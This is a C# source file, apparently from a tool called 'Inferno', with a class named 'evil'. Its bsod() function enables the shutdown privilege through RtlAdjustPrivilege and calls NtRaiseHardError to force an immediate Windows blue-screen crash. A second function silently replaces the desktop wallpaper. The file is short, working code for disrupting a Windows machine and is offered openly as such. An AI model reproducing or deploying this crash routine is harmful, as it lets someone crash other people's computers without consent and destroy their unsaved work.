using System;
using System.IO;
using System.Runtime.InteropServices;


namespace Inferno
{

	internal class evil
    {

		// Output
		private static dynamic output = new System.Dynamic.ExpandoObject();

		[DllImport("ntdll.dll")]
		public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

		[DllImport("ntdll.dll")]
		public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

		[DllImport("User32", CharSet = CharSet.Auto)] 
		public static extern int SystemParametersInfo(int uiAction, int uiParam, string pvParam, uint fWinIni);
		
		
		// Make blue screen of death
		public static void bsod()
        {
			Boolean t1;
			uint t2;
			RtlAdjustPrivilege(19, true, false, out t1);
			NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
		}

		// Set wallpaper
		public static void setWallpaper(string image)
		{
			if (File.Exists(image))
			{
				Console.WriteLine("Setting wallpaper: " + image);
				SystemParametersInfo(0x0014, 0, Path.GetFullPath(image), 0x0001);
				output.filename = image;
				core.Exit("Wallpaper set", output);
			} else
			{
				Console.WriteLine("Wallpaper file " + image + " not found!");
				output.error = true;
				core.Exit("Wallpaper not found", output, 1);
			}

		}
	}
}
